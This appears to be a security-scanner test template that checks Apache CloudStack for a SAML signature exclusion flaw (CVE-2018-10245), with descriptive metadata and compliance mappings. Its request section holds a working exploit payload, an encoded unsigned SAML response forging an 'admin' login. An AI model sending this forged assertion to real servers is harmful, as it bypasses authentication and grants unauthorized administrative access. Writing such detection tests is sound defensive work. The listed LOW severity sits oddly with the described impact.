id: APACHE_CLOUDSTACK_SAML_EXCLUSION
info:
  name: "Apache Cloudstack SAML Signature Exclusion Vulnerability"
  description: "The Apache CloudStack SAML Signature Exclusion Vulnerability refers to a flaw in how Apache CloudStack processes SAML (Security Assertion Markup Language) authentication requests. Specifically, this vulnerability arises when the signature of a SAML assertion is excluded or improperly validated, potentially allowing attackers to modify or forge authentication requests. If exploited, this flaw could enable unauthorized access to CloudStack resources by bypassing the intended security checks. Ensuring proper validation of SAML signatures is essential to mitigate this risk and maintain secure authentication."
  details: "The Apache CloudStack SAML Signature Exclusion Vulnerability occurs when CloudStack fails to properly validate the signature of SAML authentication assertions. In a typical SAML flow, the signature ensures that the identity provider’s assertion is legitimate and hasn’t been tampered with. However, if the signature is excluded or not checked correctly, an attacker could craft a malicious SAML assertion that appears valid, potentially gaining unauthorized access to CloudStack resources. To mitigate this, it's important to ensure that CloudStack is configured to fully validate SAML signatures before processing authentication requests."
  impact: "The impact of the Apache CloudStack SAML Signature Exclusion Vulnerability is significant, as it allows attackers to bypass authentication mechanisms by forging or tampering with SAML assertions. If exploited, this vulnerability could lead to unauthorized access to CloudStack resources, potentially compromising sensitive data, services, or configurations. Attackers could impersonate legitimate users or administrators, escalating privileges and causing system disruption. Ensuring robust signature validation in SAML authentication processes is critical to preventing such unauthorized access."
  category:
    name: SM
    shortName: Misconfiguration
    displayName: Security Misconfiguration (SM)
  subCategory: APACHE_CLOUDSTACK_SAML_EXCLUSION
  severity: LOW
  references:
    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa8-security-misconfiguration.md"
  cwe:
    - CWE-200
    - CWE-213
  cve:
    - CVE-2018-10245


attributes:
  nature: INTRUSIVE
  plan: FREE
  duration: FAST
compliance_standards:
  GDPR:
    - Article 32
    - Article 25
  HIPAA:
    - 45 CFR § 164.308(a)(1)(ii)(A)
    - 45 CFR § 164.312(a)(2)(i)
  SOC 2:
    - System Configuration and Management Controls
    - Access and Authorization Settings
  PCI DSS:
    - Requirement 2.2
    - Requirement 6.2
  ISO 27001:
    - A.12.1.1
    - A.12.6.2
  NIST 800-53:
    - CM-6
    - AC-17
  CSA CCM:
    - IVS-09
    - TVM-04
  CIS Controls:
    - IG1 Safeguard 4.6
    - IG1 Safeguard 5.5
  FedRAMP:
    - CM-6
    - AC-17
  NIST 800-171:
    - 3.4.6
    - 3.5.7
  FISMA:
    - CM-6
    - AC-17
  Cybersecurity Maturity Model Certification (CMMC):
    - CM.2.068
    - AC.2.008
api_selection_filters:
  method:
    neq: "OPTIONS"
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
wordLists:
  paths:
    - '/client/api?command=samlSso'
execute:
  type: single
  requests:
    - req:
        - modify_url: "${paths}"
        - modify_method: POST
        - modify_header:
            content-type: application/x-www-form-urlencoded
        - replace_body: 'RelayState=undefined&SAMLResponse=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48c2FtbHA6UmVzcG9uc2UgRGVzdGluYXRpb249Ii9jbGllbnQvYXBpP2NvbW1hbmQ9c2FtbFNzbyIgICAgSUQ9Il9iMDM4OWZjYTBlYTY1ZmU4ZTg1NyIgSW5SZXNwb25zZVRvPSJzZHZiZmRzeHZiZmRzd2VmMzJxZSIgICAgSXNzdWVJbnN0YW50PSIyMDI0LTA3LTMwVDEwOjQ4OjIwLjMwN1oiIFZlcnNpb249IjIuMCIgICAgeG1sbnM6c2FtbHA9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpwcm90b2NvbCIgeG1sbnM6eHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIj4gICAgPHNhbWw6SXNzdWVyIEZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOm5hbWVpZC1mb3JtYXQ6ZW50aXR5IiAgICAgICAgeG1sbnM6c2FtbD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiI%2BYXNkZmZkLWZ2YmZ4enNmLTIzcXIyMzMyM3EzMjwvc2FtbDpJc3N1ZXI%2BICAgIDxzYW1scDpTdGF0dXMgeG1sbnM6c2FtbHA9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpwcm90b2NvbCI%2BICAgICAgICA8c2FtbHA6U3RhdHVzQ29kZSBWYWx1ZT0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnN0YXR1czpTdWNjZXNzIiAvPiAgICA8L3NhbWxwOlN0YXR1cz4gICAgPHNhbWw6QXNzZXJ0aW9uIElEPSJfN2EyOTkzNTE0MTEyYmJjNzI2OTYiIElzc3VlSW5zdGFudD0iMjAyNC0wNy0zMFQxMDo1ODoyMC4zMDdaIiBWZXJzaW9uPSIyLjAiICAgICAgICB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiAgICAgICAgeG1sbnM6eHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIj4gICAgICAgIDxzYW1sOklzc3VlciBGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpuYW1laWQtZm9ybWF0OmVudGl0eSIgICAgICAgICAgICB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj5hc2RmZmQtZnZiZnh6c2YtMjNxcjIzMzIzcTMyPC9zYW1sOklzc3Vlcj4gICAgICAgIDxzYW1sOkNvbmRpdGlvbnMgTm90QmVmb3JlPSIyMDI0LTA3LTMwVDEwOjQzOjIwLjMwN1oiICAgICAgICAgICAgTm90T25PckFmdGVyPSIyMDI0LTA3LTMwVDEwOjUzOjIwLjMwN1oiICAgICAgICAgICAgeG1sbnM6c2FtbD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiI%2BPHNhbWw6QXVkaWVuY2VSZXN0cmljdGlvbj4gICAgICAgICAgICAgICAgPHNhbWw6QXVkaWVuY2U%2Bb3JnLmFwYWNoZS5jbG91ZHN0YWNrPC9zYW1sOkF1ZGllbmNlPiAgICAgICAgICAgIDwvc2FtbDpBdWRpZW5jZVJlc3RyaWN0aW9uPiAgICAgICAgPC9zYW1sOkNvbmRpdGlvbnM%2BICAgICAgICA8c2FtbDpBdXRoblN0YXRlbWVudCBBdXRobkluc3RhbnQ9IjIwMjQtMDctMzBUMTA6NDg6MjAuMzA3WiIgICAgICAgICAgICBTZXNzaW9uSW5kZXg9InNkdmJmZHN4dmJmZHN3ZWYzMnFlIiAgICAgICAgICAgIHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iPiAgICAgICAgICAgIDxzYW1sOkF1dGhuQ29udGV4dD4gICAgICAgICAgICAgICAgPHNhbWw6QXV0aG5Db250ZXh0Q2xhc3NSZWY%2BICAgICAgICAgICAgICAgICAgICB1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YWM6Y2xhc3NlczpQYXNzd29yZFByb3RlY3RlZFRyYW5zcG9ydDwvc2FtbDpBdXRobkNvbnRleHRDbGFzc1JlZj4gICAgICAgICAgICA8L3NhbWw6QXV0aG5Db250ZXh0PiAgICAgICAgPC9zYW1sOkF1dGhuU3RhdGVtZW50PiAgICAgICAgPHNhbWw6QXR0cmlidXRlU3RhdGVtZW50IHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iPiAgICAgICAgICAgIDxzYW1sOkF0dHJpYnV0ZSBOYW1lPSJ1aWQiICAgICAgICAgICAgICAgIE5hbWVGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphdHRybmFtZS1mb3JtYXQ6dW5zcGVjaWZpZWQiPiAgICAgICAgICAgICAgICA8c2FtbDpBdHRyaWJ1dGVWYWx1ZSB4bWxuczp4cz0iaHR0cDovL3d3dy53My5vcmcvMjAwMS9YTUxTY2hlbWEiICAgICAgICAgICAgICAgICAgICB4bWxuczp4c2k9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hLWluc3RhbmNlIiB4c2k6dHlwZT0ieHM6c3RyaW5nIj5hZG1pbjwvc2FtbDpBdHRyaWJ1dGVWYWx1ZT4gICAgICAgICAgICA8L3NhbWw6QXR0cmlidXRlPiAgICAgICAgICAgICAgICAgICAgPC9zYW1sOkF0dHJpYnV0ZVN0YXRlbWVudD4gICAgPC9zYW1sOkFzc2VydGlvbj48L3NhbWxwOlJlc3BvbnNlPg%3D%3D'
validate:
  response_code:
    eq: 302
  response_payload:
    length:
      gt: 0
  response_headers:
    for_one:
      key:
        eq: content-type
      value:
        eq: "text/xml"
strategy:
  run_once: /
